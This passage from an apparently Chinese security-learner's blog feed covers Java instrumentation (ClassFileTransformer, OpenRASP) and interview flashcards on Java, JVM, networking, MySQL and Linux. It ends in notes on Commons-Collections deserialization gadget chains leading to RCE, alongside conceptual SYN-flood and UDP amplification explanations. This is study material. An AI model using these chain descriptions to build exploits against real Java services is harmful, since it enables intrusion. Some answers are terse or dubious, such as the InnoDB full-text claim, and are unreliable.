id="ClassFileTransformer接口源码"><a href="#ClassFileTransformer接口源码" class="headerlink" title="ClassFileTransformer接口源码"></a>ClassFileTransformer接口源码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//改变指定类的Class文件，返回修改后的字节码数组。agent程序通过定义类实现该接口，自定义实现transform，修改字节码。</span></span><br><span class="line">   <span class="comment">//传入内容包括类名className,类加载器loader，字节码数组classfileBuffer等</span></span><br><span class="line">   <span class="comment">//我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后我们将新的类字节码返回给JVM，JVM会验证类和相应的修改是否合法，如果符合类加载要求JVM会加载我们修改后的类字节码。</span></span><br><span class="line">    <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">        ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ClassFileLoadHook回调实现"><a href="#ClassFileLoadHook回调实现" class="headerlink" title="ClassFileLoadHook回调实现"></a>ClassFileLoadHook回调实现</h3><p>  Instrument 就是一种 JVMTIAgent，它实现了Agent_OnLoad和Agent_OnAttach两个方法，也就是在使用时，Instrument既可以在启动时加载，也可以再运行时加动态加载。</p><p>  启动时加载和运行时加载都是监听同一个JVMTI事件，那就是ClassFileLoadHook，这个是类加载的事件，在读取类文件字节码之后回调用的，这样就可以对字节码进行修改操作。</p><p>  在JVM加载类文件时，执行回调，加载Instrument agent，创建Instrumentation接口的实例并且执行premain方法，premain方法中注册自定义的ClassFileTransformer来对字节码文件进行操作，这个就是在加载时进行字节码增强的过程。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习日志</title>
      <link href="/2022/11/14/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>/2022/11/14/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="学习日志"><a href="#学习日志" class="headerlink" title="学习日志"></a>学习日志</h1><h2 id="八股表格"><a href="#八股表格" class="headerlink" title="八股表格"></a>八股表格</h2><p>​做一些方便记忆的关键词表格。</p><h3 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-03</td><td>Java深拷贝和浅拷贝</td><td>浅拷贝，基本类型值传递，引用类型地址传递。深拷贝，实现clone方法，申请新空间，字段赋值，拷贝内容。</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="Java集合"><a href="#Java集合" class="headerlink" title="Java集合"></a>Java集合</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-02</td><td>ArrayList 与 LinkedList 区别</td><td>线程安全、数据结构、插入和删除时间复杂度、支持快速随机访问、内存空间占用</td></tr><tr><td>06-02</td><td>ArrayList的扩容原理</td><td>10，1.5</td></tr><tr><td>06-02</td><td>HashMap的底层数据结构，扩容机制</td><td>数组、链表和红黑树。默认16，加载因子0.75，数组翻倍扩容重新hash，链表8树化</td></tr><tr><td>06-02</td><td>为什么HashMap不是线程安全的</td><td>并发扩容造成环形链和数据丢失，ConcurrentHashMap</td></tr><tr><td>06-02</td><td>并发的集合都有哪些</td><td>Vector、CopyOnWriteArrayList；CopyOnWriteArraySet；ConcurrentHashMap、ConcurrentSkipListMap、Hashtable；</td></tr><tr><td>06-02</td><td>ConcurrentHashMap的线程安全是如何保证的，与Hashtable的区别</td><td>分段加锁转变为synchronized和CAS，put时是否允许其他线程put</td></tr><tr><td>06-07</td><td>面向对象的3大特征</td><td>封装，private属性，提供public的setter、getter；继承，无法直接访问父类private属性和方法，可扩展，可覆盖；多态，父类引用指向子类实例。</td></tr><tr><td>06-07</td><td>接口和抽象类的区别</td><td>共同点，都不能被实例化，都可以包含抽象方法，都有默认实现；行为约束，从属关系，继承1个，实现多个，接口中成员变量不能被修改且有初始值。</td></tr></tbody></table><h3 id="Java多线程"><a href="#Java多线程" class="headerlink" title="Java多线程"></a>Java多线程</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-02</td><td>线程池的参数有哪些，并解释出来它们的含义</td><td>corePoolSize、maximumPoolSize、keepAliveTime、unit、workQueue、threadFactory、RejectedExecutionHandler。corePoolSize-&gt;Queue-&gt;maximumPoolSize-&gt;Rejected</td></tr><tr><td>06-06</td><td>创建线程的方式</td><td>继承Thread、实现Runnable、实现Callable（将callable对象作为参数放到FutureTask类的构造器）、使用线程池如Executor框架</td></tr><tr><td>06-06</td><td>讲一下volatile关键字</td><td>作用是可见性和防止指令重排。可见性，不稳定，每次主存。防止指令重排序，内存屏障，写读屏障最好，但开销大</td></tr><tr><td>06-06</td><td>讲一下Java内存模型</td><td>并发编程的规范，原因是CPU高速缓存和指令重排会带来并发问题，做了，抽象了线程内存和主存之间的关系，抽象了happens-before原则解决指令重排</td></tr><tr><td>06-06</td><td>如何抽象线程内存和主存</td><td>抽象线程内存和主存，原因是CPU 处理速度和内存处理速度不对等，所以需要线程副本。创建的实例对象放到主存，每个线程都有一个私有的本地内存来存副本</td></tr><tr><td>06-06</td><td>讲一下happens-before原则</td><td>2个阶段，JVM、JIT编译器优化重排，处理器指令并行重排。串行语义，没义务多线程语义。happens-before定义，可见，顺序之前，但是。具体原则，顺序执行、解锁规则、volatile变量、传递、Thread启动</td></tr><tr><td>06-06</td><td>讲一下内存屏障</td><td>即时编译器，遵循happens-before规则插入内存屏障，对即时编译器会限制指令重排，对处理器会刷新缓存。向正编译的项目插入读读、读写、写读以及写写屏障，根据底层架构，转换成具体CPU指令</td></tr><tr><td>06-06</td><td>讲一下synchronized</td><td>Java关键字，访问资源同步性，修饰方法和代码块。早期，重量级锁，监视器锁monitor，映射，挂起和唤醒会转化用户态和内核态。Java6引入锁升级过程，降低开销。修饰实例方法、静态方法和代码块时</td></tr><tr><td>06-06</td><td>synchronized底层原理</td><td>synchronized修饰语句块，使用monitorenter和monitorexit指令，对象监视器monitor的计数器。synchronized修饰方法，使用ACC_SYNCHRONIZED 标识，指明了该方法是一个同步方法</td></tr><tr><td>06-06</td><td>讲一下sychronized锁升级的过程</td><td>无锁、偏向锁、线程A再次获取锁、线程B偏向锁抢锁失败、自旋锁、重量级锁</td></tr><tr><td>06-06</td><td>ThreadLocal原理</td><td>线程局部变量，每个线程Thread拥有一份自己的副本变量，多线程互不干扰。Thread -&gt; ThreadLocalMap类型的threadLocals -&gt; key为ThreadLocal，value为放入的值 -&gt; 存值是存到当前线程的ThreadLocalMap</td></tr><tr><td>06-07</td><td>synchronized 和ReentrantLock 区别</td><td>都是可重入锁，但ReentrantLock 更强大，可以实现等待可中断、公平锁、轮询、选择性通知（有条件的锁）等高级功能。synchronized 依赖于 JVM 而 ReentrantLock 依赖于 API。</td></tr><tr><td>06-07</td><td>synchronized 和 volatile 有什么区别</td><td>volatile作用于变量，轻量级；synchronized作用于方法和代码块，随着锁升级转为重量级。volatile能保证可见性，有序性，synchronized还能额外保证原子性。从常用目的来看，共享变量，访问资源同步。</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-07</td><td>JVM堆内存的区域划分和分配策略</td><td>7，新生代、老年代和永久代。8，永久代变为元空间，是直接内存。新生代的Eden区，MinorGC，大对象直接老年代，1次后仍活着放survivor的s0或s1，15次后老年代。</td></tr><tr><td>06-07</td><td>讲一下垃圾回收</td><td>死亡对象判断，引用计数法，相互引用，可达性分析，Gc Roots；垃圾收集算法，标记-清除，碎片，复制，标记压缩，老年代；分代收集，新生代，复制，老年代存活率高，标记清除or标记压缩。</td></tr><tr><td>06-07</td><td>讲一下垃圾收集器</td><td>Serial，单线程，新生代复制，老年代标记压缩；ParNew，多线程版本；Parallel Scavenge，吞吐量；Serial Old，Serial老年代版本；Parallel Old，吞吐量老年代；cms，初始标记（停），并发标记，重新标记，并发清除；G1，维护优先队列，Region分区，回收价值最大Region。</td></tr><tr><td>06-20</td><td>JVM三大部分，Java内存区域</td><td>类加载子系统，运行时数据区和执行引擎。提到Java内存区域，即运行时数据区，5，线程私有的是程序计数器、虚拟机栈和本地方法栈，共有的是堆和方法区。</td></tr><tr><td>06-21</td><td>创建一个对象的完整过程（实例初始化）</td><td>6，1.类加载（new参数合法、双亲委派）、2.分配内存（Java堆是否规整，收集器是啥，指针碰撞和空闲列表）、3.处理并发问题（CAS+失败重试，TLAB）、4.初始化分配到的内存（对象属性设置零值）、5.设置对象头（类元数据指针、hashCode、GC分代年龄、锁信息）、6.执行init方法完成初始化（初始化成员变量、执行构造方法完成实例化、将堆对象的首地址赋值给引用变量）。</td></tr><tr><td>06-21</td><td>类加载的完整过程（类加载）</td><td>加载、链接和初始化。链接分为三步，验证、准备和解析。加载，获取类文件的二进制字节流、将静态存储结构转化为方法区的动态存储结构、生成一个代表该类的Class对象，双亲委派机制指定具体哪个加载器。验证，Class文件字节流包含的信息是否符合规范，会造成恶意代码执行。准备，给类变量分配内存并设置零值。解析，将常量池中的符号引用替换为直接引用。执行<clinit>方法，执行类中的定义的Java字节码，执行static代码块。</td></tr><tr><td>06-21</td><td>类加载器详解</td><td>1.BootstrapClassLoader，最顶层，c++，jdk内存的核心库（&#x2F;lib目录下的rt.jar、resources.jar、charsets.jar包等）。ExtensionClassLoader，扩展类，加载&#x2F;lib&#x2F;ext目录下的jar包。AppClassLoader，应用类，加载当前应用classpath下的所有jar包。这些类加载器均可通过参数设置，从而能加载指定路径。</td></tr><tr><td>06-21</td><td>如何实现自定义类加载器？</td><td>1.自定义类加载器，除了BootstrapClassLoader，其他类加载器由Java实现并集成java.lang.Classloader类，两种方法，a.重写findclass方法，根据参数指定类的名字，返回Class对象的引用，b.重写loadclass方法，但是该方法实现了双亲委派模型，重写会破坏该模型。故一般重写findclass方法。2.应用，比如重写findclass方法，读取指定目录下的目标class文件，对字节流解密得到原始byte[]字节序列，然后用Native方法defineclass将byte[]转化为Class对象然后返回。</td></tr><tr><td>06-21</td><td>双亲委派模型是什么？</td><td>1.双亲委派模型，启动类加载器 &lt;- 扩展类加载器 &lt;- 应用程序类加载器 &lt;- 自定义类加载器。当上述特定的类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用。这样可以避免有些类被重复加载，也保证java核心库的类型安全。2.具体实现，先通过findLoadClass判断是否已经加载，当加载时先通过parent.loadClass向上委派，父加载器加载不到时，再调用自己的findClass尝试加载。</td></tr><tr><td>06-21</td><td>如何打破双亲委派模型？</td><td>1.继承ClassLoader抽象类，重写loadClass方法，原因是loadClass方法的具体实现；2.双亲委派模型的局限性，父加载器无法加载子加载器路径中的类，以JDBC为例，DriverManager.getConnection底层还是会调用Class.forName加载Driver，而DriverManager为rt.jar启动类，无法加载mysql这种应用类驱动，解决方式是getConnection底层获取线程加载器，<strong>通过线程加载器从子级加载器向上加载</strong>，打破双亲委派模型。Java中所有涉及SPI的加载动作基本都通过这种方式打破双亲委派模型，例如JNDI、JDBC。（重写loadClass、线程类加载器）</td></tr><tr><td>06-21</td><td>哪些情况会出现OOM问题？</td><td>1.堆内存溢出，java.lang.OutOfMemoryError: Java heap space，可能的原因，数组大小超过限、死循环、内存泄漏、系统并发高请求大内存太小，解决，用jstack、jmap、jstat排查代码，参数设置-Xms1024M -Xmx3062M JVM启动内存初始值和最大值。2.栈溢出，java.lang.StackOverflowError: Thread Stack space，可能的原因，单线程调用次数过多，一般递归层数太多，解决，排查代码、参数设置 -Xss512K 设置虚拟机栈大小。3.创建线程失败，java.lang.OutOfMemoryError: Unable to create native threads，可能的原因，JVM启动时参数-Xss指定每个线程占用的堆栈大小，如果内存不够就会创建失败。</td></tr><tr><td>06-21</td><td>如何解决OOM问题？</td><td>1.通过Dump文件分析OOM问题，jps:查找项目pid，jmap -heap pid:查看进程堆信息，两种情况：a.程序运行时，jmap可以生成dump文件，或者在线查看。b.程序挂掉，可以通过参数设置，内存溢出时自动导出dump文件。2.用jvisualvm对dump文件进行分析，找到占用高的对象，进行分析，也可点开线程信息，查看具体线程的报错代码和行数。</td></tr></tbody></table><h3 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-07</td><td>讲一次TCP三次握手、四次挥手</td><td>SYN，SYN&amp;ACK，ACK。两次握手无法确认客户端接收能力。FIN，ACK，FIN&amp;ACK&amp;seq&#x3D;y，FIN&amp;ACK，在没有数据要发送，并开启TCP延迟确认机制时，可以三次挥手，合并第2和3步骤。</td></tr><tr><td>06-09</td><td>http和https的区别</td><td>tcp和http之间加入ssl&#x2F;tls协议，密文传输；tcp三次握手，tcp三次握手基础上还要ssl&#x2F;tls握手；80，443；向CA申请数字证书。对称加密使用会话密钥保证机密性，对消息做摘要再用非对称算法签名防篡改。</td></tr><tr><td>06-09</td><td>TLS协议建立过程</td><td>索要并验证公钥、生成会话密钥，加密通信。ClientHello（随机数1，支持的密码套件），ServerHello（随机数2，数字证书，选用的密码套件），客户端用服务端公钥加密本次消息并生成会话密钥（pre-master key），服务端返回接受信息。</td></tr><tr><td>06-09</td><td>为什么抓包工具能截获https数据</td><td>中间人作为客户端，和服务器建立连接不会有问题；中间人作为服务端，和浏览器建立连接会有问题，因为浏览器需要中间人的CA证书，中间人没法去公有CA上注册证书，只能自己签发证书导入到浏览器，并设置浏览器信任该证书。比如burpsuite，浏览器和bp建立连接，bp再和服务端建立连接，那么bp就能看到明文。</td></tr><tr><td>06-09</td><td>访问一个网站，经历了哪些过程</td><td>DNS解析(递归和迭代)，TCP连接，发送HTTP请求，协议栈，服务器处理请求返回HTTP响应，浏览器解析渲染页面，连接结束。</td></tr><tr><td>06-09</td><td>http的常见状态码</td><td>1xx，提示信息，表示还需操作；2xx，成功，206应用于分块下载或断点续传；3xx，重定向，301永久，302临时，都在响应头的Location，304缓存控制；4xx，客户端错误，400请求报文有错误，403服务器禁止访问，404未找到；5xx，服务端错误，500笼统错误，502服务网关正常、后端不正常，503服务器正忙。</td></tr><tr><td>06-10</td><td>tcp和udp的差别，应用场景</td><td>面向连接，可靠传输（建立连接，重传机制、滑动窗口、流量控制、拥塞控制），是否有状态（记录是否发送），传输效率，传输形式（面向字节流、报文），首部开销，一对一，对多。应用场景，TCP，FTP文件传输，HTTP&#x2F;HTTPS；DNS，视频、音频等实时性要求高的。</td></tr><tr><td>06-09</td><td>Time_Wait发生在哪两个报文头之间</td><td>四次挥手时最后一挥。服务端处理完数据后，也向客户端发送FIN报文，之后服务端进入LAST_ACK状态，客户端收到服务端的FIN报文后，回一个ACK应答报文，之后进入TIME_WAIT状态。服务端收到该ACK，会进入CLOSE状态，关闭连接。客户端经过2MSL等待后，也进入CLOSE状态，关闭连接。作用，</td></tr><tr><td>06-10</td><td>tcp如何保证可靠传输</td><td>重传机制、滑动窗口、流量控制和拥塞控制。1.重传机制，序列号和确认应答，超时重传、快速重传（连发3个ACK）、选择性确认（提供已收到的范围），Duplicate SACK（提供重复的范围）。2.滑动窗口，无需确认应答，发送数据的最大值，窗口内缓存已发送数据，ACK清空之前所有。3.流量控制，一种机制可以让发送方根据接收方的实际接收能力控制发送的数据量，避免填满接收方的缓存。4，拥塞控制。</td></tr><tr><td>06-10</td><td>讲一下tcp拥塞控制</td><td>慢启动、拥塞避免、拥塞发生和快速恢复。慢启动，当发送方每收到一个ack，拥塞窗口cwnd的大小就会加一；cwnd超过慢启动门限ssthresh，会进入拥塞避免，当发送方每收到一个ack，cwnd增加1&#x2F;cwnd，即窗口内全收到，窗口就加一；从慢启动的指数级增长，转变为拥塞避免的线性增长。</td></tr><tr><td></td><td></td><td>拥塞发生，即数据包重传，如果是超时重传，ssthresh设为cwnd&#x2F;2，cwnd重置为1；如果是快速重传，ssrhresh设为cwnd，cwnd设为cwnd&#x2F;2。在快速重传下发生拥塞后重设窗口，会进入快速恢复，即直接拦腰进入拥塞避免，而不是超时重传时发生拥塞后重设窗口、进入慢启动。</td></tr><tr><td>06-11</td><td>TCP三次握手的详细过程，状态</td><td>首先.客户端和服务端CLOSE，服务端主动监听某个端口，处于LISTEN；1.客户端随机初始化序号，client_isn，SYN置1，发送后处于SYN-SENT状态；2.服务端收到，初始化序号，server_isn，确认号填client_isn+1，SYN和ACK置为1，发送后处于SYN-RCVD状态；3.客户端收到，确认好填server_isn+1，ACK置为1，可携带用户数据，发送后处于ESTABLISHED状态，服务端收到后也处于ESTABLISHED状态。</td></tr><tr><td>06-11</td><td>什么是SYN攻击，</td><td>攻击，攻击者短时间伪造不同IP地址的SYN报文，服务端每收到1个SYN，就进入SYN_RCVD状态，发送SYN+ACK报文，但无法获得客户端ACK应答，久而久之就会占满服务端的半连接队列，再遇到SYN报文就会直接丢弃，使得服务端不能为正常用户服务。</td></tr><tr><td>06-11</td><td>如何避免SYN攻击</td><td>3.调大netdev_max_backlog，当网卡接收速度大于内核处理速度，会有该队列保存数据；1.增大TCP半连接队列；4.开启net.ipv4.tcp_syncookies，可以在不使用SYN半连接队列的情况下成功建立连接，cookie值放入第二次握手的序列号里，成功就直接放入全连接队列；2.减少SYN+ACK重传次数，比如2次重传失败后，就断开SYN_REVC状态的TCP半连接。</td></tr><tr><td>06-11</td><td>TCP四次挥手的详细过程，状态</td><td>首先，客户端和服务端ESTABLISHED；1.客户端打算关闭连接，FIN报文，进入FIN_WAIT_1状态；2.服务端收到后，发送ACK，进入CLOSED_WAIT状态；客户端收到后，进入FIN_WAIT_2状态；3.服务端处理完数据，发送FIN报文，进入LAST_ACK状态；4.客户端收到，发送ACK，进入TIME_WAIT状态；服务端收到，进入CLOSE状态，连接关闭，客户端在2MSL一段时间后，进入CLOSE状态，连接关闭。等2MSL是因为，如果服务端每收到ACK，会重新发送FIN，如果2MSL后没收到，说明服务端已经关闭连接。</td></tr><tr><td>06-11</td><td>为什么是三次握手？</td><td>三次握手，因为三次握手才能保证双方具有接收和发送的能力，没有第三次握手就无法确认客户端的接收能力，更详细地说，三次握手才可以1.阻止重复历史连接的初始化（如果收到SYN就进入ESTABLISHED，这样就没有中间态发RST断掉历史连接），2.同步双方初始序列号（合并四次握手，都给对方序列号），3.避免资源浪费（每发一个SYN+ACK，无法确认客户端是否接收就匆忙建立连接，会因为阻塞造成浪费）；</td></tr><tr><td>06-11</td><td>为什么挥手需要四次？</td><td>1.客户端发送FIN时，仅表示不再发送数据但是还能接收；2.服务端收到FIN时，先回一个ACK，但还有其他数据要发送，最后发FIN，这两次挥手去不掉；3.客户端最后回ACK同意关闭连接，这样大家都能关，这一次挥手也去不掉。但是，如果“服务端没有数据要发送”且“TCP开启延迟确认”（不携带数据的ACK会慢点发），2、3挥手合并。</td></tr><tr><td>06-11</td><td>tcp是大端序还是小端序？</td><td>所有网路协议都是采用大端序方式来传输数据的，大端序又称网络字节序。大端序，高位字节在低地址，低位字节在高地址，适合阅读习惯，比如0x2266用两个字节存储，大端序就是低地址存0x22，高地址存0x66，但是，高位字节是0x22。而小端序适合计算机读取，它一般从低位字节开始。</td></tr><tr><td>06-11</td><td>TCP粘包问题，如何处理？</td><td>在tcp的socket编程中，发送端为了将多个发往接收端的包，更加高效地发送给接收端，会采用Nagle优化算法，即只有上一分组得到确认，才发送下一个分组；收集多个小分组，在一个确认到来时一起发送。这样接收缓冲区，就会有后一数据包的头紧接着前一数据包的尾。如何处理？发送方可关闭Nagle算法，接收方根据应用层具体协议拆分数据包。UDP不会粘包，因为它面向报文，而不是字节流，报文独立。</td></tr><tr><td>06-11</td><td>冗余确认为什么是3次ACK而不是2次？</td><td>冗余确认的原因可能是乱序到达和丢包，两次的话可能是乱序到达造成，三次的化绝大部分是丢包了，需要快速重传。俺感觉就是，为了不混淆，连发3个就是需要快速重传的信号。</td></tr><tr><td>06-11</td><td>OSI七层模型</td><td>1.物理层，通过媒介传输比特，确定机械和电器规范，单位是bit，主要协议IEE802.3；2.数据链路层，将比特封装成帧，点到点传递，单位是帧，主要协议MAC、VLAN；3.网络层，负责数据包从源到目的地址的传递，寻址和路由，传输单位是包，主要协议IP、ARP、ICMP；4.传输层，提供端到端的报文传递和错误恢复，单位是报文，协议是TCP和UDP；5.会话层，建立、管理和终止会话，单位是SPDU，协议是RPC；6.表示层，对数据进行翻译、加密和压缩，单位是PPDU，主要协议是JPEG；7.应用层，负责提供数据处理接口标准，单位是APDU，主要协议是FTP、HTTP和DNS。</td></tr><tr><td>06-11</td><td>TCP&#x2F;IP四层模型，IP协议可靠吗</td><td>网络接口层：MAC、VLAN；网络层：IP、ARP、ICMP；传输层：TCP、UDP；应用层：HTTP、DNS和SMTP。IP协议无连接，不可靠，尽力数据投递，可靠应该是指进程通信的连接。</td></tr><tr><td>06-11</td><td>为什么要分层</td><td>独立，不关心其他层内容；灵活，一层变化不影响其他层；每层都用最好的技术；易于实现和维护，为每层维护独立系统；标准化，便于对每层的功能精确说明。缺点，有些功能在不同层重复出现，产生额外开销。</td></tr><tr><td>06-11</td><td>uri、url和urn有何区别</td><td>统一资源标识符、定位符和名称。uri表示符表示一种抽象，而url用地址、urn用名称定位是一种实现。</td></tr><tr><td>06-11</td><td>http1.0、1.1和2.0的区别</td><td>1.0，每个请求都是单独连接，做不到连接的复用；1.1，默认开启长连接，一个TCP连接上可以传送多个HTTP请求和响应，支持管道网络传输，只要第一个请求发出去了，不必等其回来就能发第二个请求；2.0，多路复用，同时传输a、b文件，引入二进制数据帧，对帧编号id，从而能并行传输数据。</td></tr><tr><td>06-11</td><td>解释一下ping命令</td><td>ICMP，确认 IP 包是否成功送达目标地址、报告发送过程中 IP 包被废弃的原因和改善网络设置等。ICMP报文封装在IP包里面，工作在网络层，主要有查询报文类型（0应答，8请求），和差错报文类型（3目标不可达、4原点抑制、5重定向或改变路由、11超时）。ping命令执行时，构建一个ICMP回送请求消息，字段中类型为8，序号为1（会发送多个），会记录发送时间来计算往返时延，目标主机会构建一个会送响应消息。</td></tr><tr><td>06-12</td><td>解释一下traceroute命令</td><td>充分利用ICMP差错类型报文，比如利用IP包的生存期限从1开始按照顺序递增的同时发送UDP包，强制接收ICMP超时消息。比如TTL设置为1，遇到第一个路由器就牺牲了，接着返回ICMP差错报文，类型是超时，通过不断增加TTL，就能拿到路径上所有路由器IP。</td></tr><tr><td>06-11</td><td>Cookie和Session的区别</td><td>Cookie主要用来保存用户信息，不需要重新登录。Session主要作用是通过服务端记录用户的状态，因为HTTP协议是无状态的。区别：1.Cookie可以存在浏览器或本地，Session只能存在服务器；2.session能存任意Java对象，cookie只能存字符串；3.session比cookie更安全，cookie可能被拦截获取；4.session占用服务器性能，压力更大。</td></tr><tr><td>06-12</td><td>UDP反射放大攻击</td><td>反射型DDOS，攻击者不直接攻击目标服务器IP，而是伪造被攻击者的IP向某些公开服务器发送请求报文，该服务器会将数倍于请求报文的响应数据发送回伪造IP。由于UDP不建立连接，且允许IP源地址伪造，而很多协议的响应包，是远大于请求包的，从而能达到反射放大。</td></tr></tbody></table><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-06</td><td>进程间通信的方式、线程间通信的方式</td><td>进程间通信，管道、消息队列、共享内存、信号、信号量socket。线程间通信，wait&#x2F;notify，volatile&#x2F;sychronized实现共享内存？？</td></tr><tr><td>06-11</td><td>进程和线程的区别，什么是协程</td><td></td></tr><tr><td>06-11</td><td></td><td></td></tr><tr><td>06-11</td><td></td><td></td></tr></tbody></table><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-03</td><td>数据库事务的四大特性</td><td>原子性，一致性，隔离性和持久性。原子性undo log，隔离性MVCC和锁机制，持久性redo log，一致性是通过原子性+隔离性+持久性保证的。</td></tr><tr><td>06-03</td><td>mysql事务隔离级别有哪些，可重复读隔离级别是否可解决幻读</td><td>脏读，不可重复读和幻读。读未提交、读提交、可重复读和串行化。默认可重复读，很大程度避免，针对快照读，MVCC；针对当前读，临键锁。</td></tr><tr><td>06-03</td><td>MVCC底层原理</td><td>ReadView，creator_trx_id、m_ids、min_trx_id、max_trx_id。记录行中和MVCC相关的两个隐藏列，trx_id，roll_pointer（undo log版本链）。</td></tr><tr><td>06-03</td><td>mysql索引失效的情况</td><td>左模糊匹配，索引是varchar，使用函数，or两端都得是索引和最左匹配原则。</td></tr><tr><td>06-03</td><td>mysql索引有哪些</td><td>数据结构、物理存储、字段特性、字段个数。</td></tr><tr><td>06-03</td><td>mysql有哪些日志</td><td>undo log，原子性，事务回滚和MVCC。redo log，持久性，掉电恢复。bin log，server层日志，用于数据备份和主从复制。</td></tr><tr><td>06-09</td><td>innodb和myiasm的区别</td><td>InnoDB优势，支持事务、外键和行级锁。InnoDB是聚集索引，不支持全文索引，必须有唯一索引，Myiasm反之。</td></tr><tr><td>06-09</td><td>索引的缺点有哪些</td><td>创建和维护要耗费时间、占磁盘空间、降低表更新的速度。</td></tr><tr><td>06-09</td><td></td><td></td></tr></tbody></table><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-20</td><td>目录操作相关的命令</td><td>cd切换目录；ls显示目录下文件；ll是ls -l的简写；find在指定目录及其子目录中搜索文件或目录；pwd显示当前工作路径；rmdir删除空目录；rm -r递归删除目录；cp文件复制；mv移动文件或目录；</td></tr><tr><td>06-20</td><td>文件操作相关的命令</td><td>touch创建新文件；ln -s创建软链接；cat&#x2F;more&#x2F;less&#x2F;tail查看文件；tail -f可以动态日志监控；vim修改文件；</td></tr><tr><td>06-20</td><td>文件压缩命令</td><td>tar -zcvf是压缩文件，v可视，f指定文件名，c压缩，z调用gzip压缩命令进行压缩；tar -xvf是解压文件，x解压，-C指定解压位置。</td></tr><tr><td>06-20</td><td>文件传输命令</td><td>scp是通过SSH协议安全地文件上传或下载；rsync高效地远程文件上传或下载；ftp连接远程ftp服务器来上传或下载。</td></tr><tr><td>06-20</td><td>文件权限命令</td><td>777，用户、组、其他用户，r可读，w可写，x可执行。chmod 764 aaa.txt修改权限。开机自启动脚本的写法：1.新建脚本bmsk；2.添加可执行权限chmod +x bmsk；3.添加到开机启动项：chkconfig –add bmsk；4.检查是否添加成功chkconfig –list。</td></tr><tr><td>06-20</td><td>用户管理命令和用户组管理命令</td><td>useradd、userdel、usermod管理用户账号，groupadd、groupdel、groupmod管理组；passwd -S bmsk显示用户bmsk的密码信息；passwd -d bmsk清除用户bmsk的密码，让其无法登录；passwd bmsk修改用户bmsk的密码；</td></tr><tr><td>06-20</td><td>系统状态命令</td><td>top显示CPU、内存和进程信息；htop带UI的top；uptime查看主机开机时间、负载；free查看内存使用情况；df查看系统磁盘使用情况；du查看指定目录的磁盘使用情况；sar用于收集、报告和分析系统性能；ps查看系统进程信息，查看特定进程ps aux|grep redis；systemctl用于管理系统服务和单元，包括查看状态、启动、停止和重启。</td></tr><tr><td>06-20</td><td>网络通信命令</td><td>ping测试主机连通性；ifconfig查看ip地址、mac地址、状态等；netstat -ano查看网络连接情况，监听端口等信息；ss是更快的netstat。</td></tr><tr><td>06-20</td><td>其他命令</td><td>sudo以root用户执行命令；grep 要搜索的字符串 要搜索的文件 –color，高亮搜索；kill -9 pid（先用ps获取进程的pid，9表示强制杀死）；shutdown -h now立即关机，shutdown -5 “关机”，5分钟后关机并推送警告；reboot重启。</td></tr></tbody></table><h3 id="———————————————————————————————————————————————————————————"><a href="#———————————————————————————————————————————————————————————" class="headerlink" title="———————————————————————————————————————————————————————————-"></a>———————————————————————————————————————————————————————————-</h3><h3 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-12</td><td>谈下CC链中三个重要的Transformer</td><td><code>ConstantTransformer</code>类的<code>transform</code>方法直接返回传入的类对象，<code>ChainedTransformer</code>类中的<code>transform</code>方法会链式调用其中的其他<code>Transformer.transform</code>方法，<code>InvokerTransformer</code>类根据传入参数可以反射调用对应的方法，<code>InstantiateTransformer</code>类可以调用构造器，直接实例化对象。</td></tr><tr><td>06-12</td><td>谈谈CC1</td><td>原理是<code>LazyMap.get</code>可以触发构造的<code>Transformer</code>链的<code>transform</code>方法导致<code>RCE</code>，基于动态代理触发的<code>LazyMap.get</code>，在<code>AnnotationInvocationHanlder</code>中的<code>invoke</code>方法中存在<code>Map.get</code>操作。</td></tr><tr><td>06-12</td><td>谈谈CC2</td><td>该链用到<code>TemplatesImpl</code>类，生成恶意的字节码实例化，不过触发点是<code>PriorityQueue</code>类，反射设置属性<code>TransformingComparator</code>，<code>PriorityQueue</code>类是优先队列，其中包含了排序功能，该功能可以设置比较器<code>comparator</code>，而<code>TransformingComparator</code>的<code>compare</code>方法会调